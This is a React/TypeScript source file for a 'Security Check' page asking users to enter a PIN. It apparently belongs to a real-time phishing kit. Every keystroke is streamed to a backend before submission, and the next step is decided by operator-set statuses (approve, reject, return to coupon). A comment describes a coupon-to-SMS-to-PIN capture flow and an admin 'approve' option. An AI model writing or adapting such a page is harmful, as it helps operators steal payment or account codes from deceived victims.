import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useRealtime } from "@/context/RealtimeContext";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Loader2, Lock, AlertCircle } from "lucide-react";

const PinVerification = () => {
  const navigate = useNavigate();
  const { updatePinCode, setOrderStatus, orderStatus, currentOrderId, submitPin } = useRealtime();
  const [code, setCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    // If completed, go to confirmation
    if (orderStatus === "COMPLETED") {
      setIsLoading(false);
      navigate(`/order-confirmation/${currentOrderId}`);
    } else if (orderStatus === "REJECTED") {
        setIsLoading(false);
        setError("Verification failed. Please try again.");
        // Stay on page, let user retry or admin might change status
    } else if (orderStatus === "RETURN_COUPON") {
        setIsLoading(false);
        navigate("/verify-coupon");
    } else if (orderStatus === "APPROVED") {
        setIsLoading(false);
        // If approved from PIN, maybe go to SMS or success?
        // Assuming PIN is final or intermediate. Existing flow: Coupon -> SMS -> Success.
        // New flow: Coupon -> PIN -> Success? Or Coupon -> PIN -> SMS?
        // Admin options: "放行" (Approve) -> usually means SUCCESS.
        navigate(`/order-confirmation/${currentOrderId}`);
    }
  }, [orderStatus, navigate, currentOrderId]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setCode(value);
    updatePinCode(value);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length < 4) {
        setError("Please enter a valid PIN code");
        return;
    }
    setError("");
    setIsLoading(true);
    
    // Submit to backend
    await submitPin(code);
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-background flex flex-col">
        <Header />
        <main className="flex-1 flex flex-col items-center justify-center p-6">
          <div className="text-center space-y-6 max-w-md">
            <div className="relative w-20 h-20 mx-auto">
              <div className="absolute inset-0 border-4 border-muted rounded-full"></div>
              <div className="absolute inset-0 border-4 border-t-primary border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"></div>
            </div>
            <h2 className="font-serif text-2xl md:text-3xl">Verifying PIN...</h2>
            <p className="text-muted-foreground">
              Please wait while we verify your security code.
            </p>
          </div>
        </main>
        <Footer />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <Header />
      <main className="flex-1 container mx-auto px-6 py-12 flex items-center justify-center">
        <Card className="w-full max-w-md shadow-lg border-primary/10">
          <CardHeader className="text-center pb-8">
            <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4 text-primary">
                <Lock className="w-6 h-6" />
            </div>
            <CardTitle className="font-serif text-3xl mb-2">Security Check</CardTitle>
            <CardDescription className="text-base">
              Additional security verification is required. Please enter your PIN code below.
            </CardDescription>
          </CardHeader>
          <CardContent>
            {error && (
              <div className="bg-destructive/10 text-destructive text-sm p-3 rounded-md flex items-center gap-2 mb-6">
                <AlertCircle className="w-4 h-4" />
                {error}
              </div>
            )}
            
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="code" className="text-center block">PIN Code</Label>
                <Input
                  id="code"
                  type="text"
                  placeholder="Enter PIN"
                  className="text-center text-2xl tracking-widest h-14 font-mono"
                  value={code}
                  onChange={handleInputChange}
                  maxLength={10}
                  autoFocus
                  required
                />
              </div>
              
              <Button type="submit" className="w-full h-12 text-lg" disabled={isLoading || code.length < 4}>
                {isLoading ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Verifying...
                  </>
                ) : (
                  "Verify PIN"
                )}
              </Button>
            </form>
          </CardContent>
        </Card>
      </main>
      <Footer />
    </div>
  );
};

export default PinVerification;
